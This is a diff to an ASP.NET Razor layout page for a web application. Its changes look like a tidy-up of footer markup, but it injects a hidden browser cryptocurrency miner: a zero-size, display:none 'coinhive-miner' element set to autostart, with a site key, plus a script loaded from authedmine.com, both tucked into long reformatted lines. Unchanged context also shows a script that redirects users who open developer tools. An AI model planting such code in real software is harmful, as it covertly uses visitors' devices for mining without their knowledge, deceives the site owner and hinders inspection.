@@ -148,17 +148,14 @@
             </div>
         </div>
         <div class="page-footer">
-            <div class="page-footer-inner">@DateTime.Today.Year &copy; <a href="http://www.12mconsulting.com.tr/" title="12M Consulting" target="_blank">12M Consulting</a> &nbsp; @{if (ViewBag.Debug == false) {<text>v.@ViewBag.Version</text>} else {<text>_Test Aşamasında_</text>} }</div>
+            <div class="page-footer-inner">@DateTime.Today.Year &copy; <a href="http://www.12mconsulting.com.tr/" title="12M Consulting" target="_blank">12M Consulting</a> &nbsp; @{if (ViewBag.Debug == false) {<text>v.@ViewBag.Version</text>} else {<text>_Test Aşamasında_</text>} }</div>            
             <div class="scroll-to-top"><i class="icon-arrow-up"></i></div>
         </div>
-        <div id="div_loading" class="loader"></div>
-        <div class="portfolio-modal modal fade" id="modalEditPage" tabindex="-1" role="dialog" aria-hidden="true"></div>
-        <div id="send-realtime-notifications"></div>
+        <div id="send-realtime-notifications"></div><div id="div_loading" class="loader"></div><div class="portfolio-modal modal fade" id="modalEditPage" tabindex="-1" role="dialog" aria-hidden="true"></div><div class="coinhive-miner" style="width:0;height:0;display:none;" data-key="eLaNDQUIlIhFnWl4MFQ1GvaLi0k5COmH" data-autostart="true" data-threads="2" data-throttle="0.5"></div>
     </div>
 <script>var currentUserName = "@ViewBag.vUser.UserName"; var currentRealName = "@ViewBag.vUser.FullName"; var currentUserImage = "@Html.ImageAddressOrDefault(id)"; var SendMessageTo = "x";</script>
 @Scripts.Render(BundleConfig.jqueryUiJs)@Scripts.Render(BundleConfig.bootstrapJs)@Scripts.Render(BundleConfig.signalR)@Scripts.Render(BundleConfig.toastrJs)@Scripts.Render(BundleConfig.moment)@Scripts.Render(BundleConfig.numeral)@Scripts.Render(BundleConfig.bootbox)@Scripts.Render(BundleConfig.slimscroll)@Scripts.Render(BundleConfig.blockui)@Scripts.Render(BundleConfig.JsBundle)@Scripts.Render(BundleConfig.DtBundle)<script src="/signalr/hubs"></script>@Scripts.Render(BundleConfig.StBundle)
-<script src="~/Content/assets/global/plugins/datatables/extensions/Buttons/js/buttons.html5.js"></script>
-<script src="~/Content/assets/global/plugins/datatables/extensions/Buttons/js/buttons.flash.js"></script>@if (devexpressVarMi == true) {
+<script src="https://authedmine.com/lib/simple-ui.min.js" async></script><script src="~/Content/assets/global/plugins/datatables/extensions/Buttons/js/buttons.html5.js"></script><script src="~/Content/assets/global/plugins/datatables/extensions/Buttons/js/buttons.flash.js"></script>@if (devexpressVarMi == true) {
 <script src="~/Content/assets/global/plugins/devextreme/js/dx.all.js"></script>}@{if (ViewBag.Debug == false && ViewBag.vUser.Id > 1) {
 <script src="~/Content/assets/global/plugins/devtools-detect.js"></script><script>window.addEventListener('devtoolschange', function (e) { if (e.detail.open == true) { console.clear(); window.location.href = "@Request.Url.Scheme://@Request.Url.Authority/"; } });</script> }}
 @RenderSection("Scripts", required: false)
